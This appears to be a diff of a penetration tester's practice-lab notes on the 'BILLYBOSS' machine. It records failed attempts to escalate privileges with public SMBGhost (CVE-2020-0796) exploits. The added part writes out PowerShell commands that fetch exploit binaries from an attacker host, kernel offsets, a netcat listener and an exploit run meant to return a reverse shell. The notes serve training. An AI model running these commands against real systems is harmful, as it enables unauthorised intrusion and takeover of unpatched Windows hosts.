@@ -1,3 +1,10 @@
+
+
+# notes - stuck
+
+BILLYBOSS
+
+
 This lab involves exploiting Sonatype Nexus 3.21.0-05 for authenticated remote code execution and using the SMBGhost vulnerability to escalate privileges. Learners will craft payloads to gain initial access and leverage an unpatched SMB service to obtain a SYSTEM shell. The lab highlights web application vulnerabilities and critical privilege escalation techniques.
 
 - Enumerate services to identify the Sonatype Nexus application on port 8081 and confirm its version.
@@ -327,3 +334,67 @@ let's try compiling this ourselves.
 
 https://github.com/danigargu/CVE-2020-0796
 
+well. we already have it actually. the releases page. no need to redo that.
+
+```bash
+
+
+wget https://github.com/danigargu/CVE-2020-0796/releases/download/v1.0/cve-2020-0796-local_static.zip
+unzip cve-2020-0796-local_static.zip
+
+# victim
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/cve-2020-0796-local.exe -OutFile ./cve-2020-0796-local.exe"
+cve-2020-0796-local.exe
+
+```
+
+failure.
+
+let's try this repo..
+
+
+https://github.com/jamf/CVE-2020-0796-RCE-POC
+
+```bash
+
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/calc_target_offsets.bat -OutFile ./calc_target_offsets.bat"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/cdb.exe -OutFile ./cdb.exe"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/cdb.exe -OutFile ./cdb.exe"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/dbghelp.dll -OutFile ./dbghelp.dll"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/dumpbin.exe -OutFile ./dumpbin.exe"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/link.exe -OutFile ./link.exe"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/msvcp140.dll -OutFile ./msvcp140.dll" 
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/symsrv.dll -OutFile ./symsrv.dll"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/tbbmalloc.dll -OutFile ./tbbmalloc.dll"
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/vcruntime140.dll -OutFile ./vcruntime140.dll"
+ powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/tools/vcruntime140_1.dll -OutFile ./vcruntime140_1.dll"
+
+calc_target_offsets.bat
+
+OFFSETS = { #
+    'srvnet!imp_IoSizeofWorkItem': 0x32210, #
+    'srvnet!imp_RtlCopyUnicodeString': 0x32288, #
+    'nt!IoSizeofWorkItem': 0x6D7A0, #
+} #
+
+nano SMBleedingGhost.py
+# (add offsets to top of file...)
+
+nc -nlvp 6666
+
+python SMBleedingGhost.py 192.168.51.61 192.168.49.51 6666
+
+```
+
+damnit. I think this needs to be run by the victim.
+
+```bash
+
+powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/CVE-2020-0796-RCE-POC/SMBleedingGhost.py -OutFile ./SMBleedingGhost.py"
+
+python ./SMBleedingGhost.py
+
+
+```
+
+victim doesn't have python. dog damnit. i feel stuck and am going to move on.
